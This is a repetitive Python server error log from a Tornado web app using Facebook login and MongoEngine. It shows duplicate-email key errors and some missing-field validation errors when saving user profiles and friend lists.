  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
